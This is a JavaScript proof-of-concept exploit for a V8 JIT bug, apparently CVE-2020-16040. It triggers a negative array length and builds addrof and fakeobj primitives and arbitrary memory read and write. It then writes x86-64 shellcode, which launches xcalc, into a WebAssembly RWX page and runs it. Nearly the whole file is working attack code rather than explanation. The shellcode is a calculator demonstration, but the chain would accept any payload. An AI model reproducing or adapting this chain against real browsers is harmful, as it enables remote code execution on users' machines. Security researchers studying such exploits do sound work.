/* references:
https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ [1]
https://faraz.faith/2021-01-07-cve-2020-16040-analysis/ [2]
*/

const buf = new ArrayBuffer(8);
const f64_buf = new Float64Array(buf);
const u64_buf = new Uint32Array(buf);

function exit(msg) {
	throw new Error(msg);
} 

function ftoi(val) {
	f64_buf[0] = Number(val);
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
	u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
	u64_buf[1] = Number(BigInt(val) >> 32n);
	return f64_buf[0];
}

function addrof(obj) {
	arr[9] = obj;
	const addr = ftoi(second[1]);
	second[1] = 1.1;

	return addr & 0xffffffffn;
}

function fakeobj(addr) {
	second[1] = itof(addr);
	const obj = arr[9];
	second[1] = 1.1;

	return obj;
}

function foo(a) {
	let y = 0x7fffffff;

	/* 
	Make sure we fail the first 'if' statement inside 
	'VisitSpeculativeIntegerAdditiveOp'
	*/
	if (a == NaN) y = NaN;

	// Gather type feedback 
	if (a) y = -1;

	let z = (y + 1) | 0;
	
	z = (z == 0x80000000) | 0;
	if (a == 'wellooo') z = -1;

	let arr = new Array(z);
	arr.shift();
	let second = [1.1, 1.1, 1.1];
	
	return [arr, second];
}

for (let i = 0; i < 20000; i++) {
	foo(true);
}

const ret_value = foo(false);
var arr = ret_value[0];
var second = ret_value[1];

if (arr.length != -1) {
	exit('bad array length');
}
console.log('[+] got negative array length');

// because we have linear read/write beyond arr
// we can overwrite 'second' length and obtain the map

// overwrite 'length' of 'second'
arr[16] = 0x4141;
if (second.length < 1000) {
	exit('bad second array length');
} 
console.log('[+] got bigger second array length');

let float_map = ftoi(second[3]) & 0xffffffffn;
console.log(`[+] leaked float map: 0x${float_map.toString(16)}`);	


arb_rw_arr = [itof((float_map << 32n) + float_map), 1.1];

function arb_read(addr) {
	if (BigInt(addr) % 2n == 0n) {
		addr = BigInt(addr) + 1n;
	}

	fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
	arb_rw_arr[1] = itof((0x10n << 32n) + addr - 0x8n);
	return ftoi(fake[0]);
}

function arb_write(addr, value) {
	if (BigInt(addr) % 2n == 0n) {
		addr = BigInt(addr) + 1n;
	}

	fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
	arb_rw_arr[1] = itof((0x10n << 32n) + addr - 0x8n);
	fake[0] = itof(value);
}

function copy_shellcode(shellcode) {
	let temp_buf = new ArrayBuffer(0x100);
	let view = new DataView(temp_buf);
	let backing_store_addr = addrof(temp_buf) + 0x14n - 0x1n;

	arb_write(backing_store_addr, rwx_addr);

	for (let i = 0; i < shellcode.length; i++) {
		view.setUint8(i, shellcode[i]);
	}
}

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let rwx_addr = arb_read(addrof(wasm_instance) + 0x67n);
console.log(`[+] rwx addr at - 0x${rwx_addr}`);

// https://github.com/r4j0x00/exploits/blob/master/chrome-exploit/exploit.js
var shellcode = new Uint8Array([72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90, 72, 1, 226, 82, 72, 137, 226, 106, 99, 72, 184, 98, 105, 110, 47, 120, 99, 97, 108, 80, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 44, 98, 1, 46, 116, 114, 115, 46, 72, 49, 4, 36, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 49, 246, 86, 106, 19, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5, 0]);

copy_shellcode(shellcode);

f();